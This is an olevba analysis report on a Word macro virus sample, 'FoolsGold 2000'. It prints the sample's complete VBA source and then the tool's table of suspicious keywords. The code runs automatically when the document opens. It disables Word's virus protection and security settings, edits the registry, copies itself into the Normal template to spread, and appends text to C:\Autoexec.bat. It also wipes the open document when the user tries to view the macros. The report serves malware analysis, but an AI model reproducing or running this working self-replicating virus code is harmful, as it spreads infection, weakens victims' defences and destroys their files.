olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fool-79e2c28687f28f18c0048c4f79cfeaa91c3551d8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fool-79e2c28687f28f18c0048c4f79cfeaa91c3551d8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Fool.bas 
in file: Virus.MSWord.Fool-79e2c28687f28f18c0048c4f79cfeaa91c3551d8 - OLE stream: 'Macros/VBA/Fool'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoOpen()
    'FoolsGold 2000 Virus V2.00
    'The WaLRuS 04/00
    On Error Resume Next
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    ActiveDocument.ReadOnlyRecommended = False
    If (Second(Now()) > 50) Then System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "The WaLRuS"
    If Day(Now) = 31 Then Call Payload
    Set Norm = NormalTemplate.VBProject.VBComponents
    Set Doc = ActiveDocument.VBProject.VBComponents
If Norm.Item("Fool").Name <> "Fool" Then
    Doc("Fool").Export "c:\Fool.drv"
    Set infect = NormalTemplate.VBProject
ElseIf Doc.Item("Fool").Name <> "Fool" Then
    Norm("Fool").Export "c:\Fool.drv"
    Set infect = ActiveDocument.VBProject
End If
infect.VBComponents.Import ("c:\Fool.drv")
Kill ("c:\Fool.drv")
ActiveDocument.Save
End Sub

Sub HelpAbout()
    On Error Resume Next
    Call Payload
End Sub

Sub Payload()
    On Error Resume Next
    MsgBox "FoolsGold 2000 by The WaLRuS", vbInformation
    Assistant.Visible = True
    With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Text = "FoolsGold 2000 Thanks You!"
    .Heading = "GREETINGS"
    .Show
    End With
    SetAttr "C:\Autoexec.bat", 0
    Open "C:\Autoexec.bat" For Append As #1
    Print #1, "CLS"
    Print #1, "ECHO                ЦДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД·"
    Print #1, "ECHO                є  *****************************************  є"
    Print #1, "ECHO                є  *  FoolsGold 2000 Virus by The WaLRuS   *  є"
    Print #1, "ECHO                є  *****************************************  є"
    Print #1, "ECHO                є  The Fools Gold Virus wishes to thank the   є"
    Print #1, "ECHO                є  user of this computer because you have     є"
    Print #1, "ECHO                є  helped to spread the good words of peace!  є"
    Print #1, "ECHO                є  WaLRuS                                     є"
    Print #1, "ECHO                УДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДЅ"
    Close #1
Finish:
End Sub

Sub ToolsMacro()
    On Error Resume Next
    Call Stealthy
End Sub

Sub FileTemplates()
    On Error Resume Next
    Call Stealthy
End Sub

Sub ViewVBCode()
    On Error Resume Next
    Call Stealthy
End Sub

Sub Stealthy()
    On Error Resume Next
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    ActiveDocument.Save
    Call Payload
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

